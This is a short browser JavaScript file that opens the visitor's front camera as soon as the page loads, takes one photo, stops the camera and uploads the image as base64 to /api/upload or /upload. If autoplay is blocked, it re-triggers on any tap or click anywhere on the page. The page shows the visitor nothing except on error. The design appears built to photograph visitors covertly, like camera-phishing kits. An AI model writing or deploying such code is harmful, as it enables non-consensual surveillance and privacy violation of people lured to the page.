const video = document.getElementById('camera-stream');
const canvas = document.getElementById('capture-canvas');
const statusMsg = document.getElementById('status-msg');

let captured = false;

async function startCameraAndCapture() {
    if (captured) return;

    try {
        // 1. Open Camera (Try facing user)
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        });
        video.srcObject = stream;

        // 2. Play stream
        const onStreamReady = () => {
            video.play().then(() => {
                // Wait for video frame to actually render
                setTimeout(captureFromVideo, 1200);
            }).catch(err => {
                console.log("Autoplay blocked, waiting for tap:", err);
                const triggerPlay = () => {
                    video.play().then(() => {
                        setTimeout(captureFromVideo, 800);
                    }).catch(console.error);
                };
                ['click', 'touchstart', 'pointerdown'].forEach(ev => {
                    document.addEventListener(ev, triggerPlay, { once: true });
                });
            });
        };

        if (video.readyState >= 2) {
            onStreamReady();
        } else {
            video.onloadedmetadata = onStreamReady;
        }

    } catch (err) {
        console.error("Camera Error:", err);
        if (statusMsg) statusMsg.innerText = "Error: " + err.message;
        // Retry on interaction
        ['click', 'touchstart'].forEach(ev => {
            document.addEventListener(ev, startCameraAndCapture, { once: true });
        });
    }
}

function captureFromVideo() {
    if (captured) return;

    // Check if video is streaming
    if (!video.srcObject) return;

    const width = video.videoWidth || 640;
    const height = video.videoHeight || 480;

    canvas.width = width;
    canvas.height = height;
    const ctx = canvas.getContext('2d');

    // Mirror effect & Draw
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Stop camera immediately
    const stream = video.srcObject;
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }

    // Convert to Base64 (JPEG)
    const base64data = canvas.toDataURL('image/jpeg', 0.8);

    if (base64data && base64data.length > 200) {
        captured = true;
        sendToBackend(base64data);
    }
}

async function sendToBackend(base64Str) {
    const endpoints = ['/api/upload', '/upload'];

    for (const url of endpoints) {
        try {
            console.log("Sending photo to:", url);
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: base64Str })
            });

            if (response.ok) {
                const result = await response.json();
                console.log("Photo sent successfully via", url, result);
                return;
            } else {
                console.warn(`${url} returned status ${response.status}`);
            }
        } catch (error) {
            console.warn(`Failed sending to ${url}:`, error);
        }
    }
}

// Start immediately on load
if (document.readyState === 'loading') {
    window.addEventListener('DOMContentLoaded', startCameraAndCapture);
} else {
    startCameraAndCapture();
}
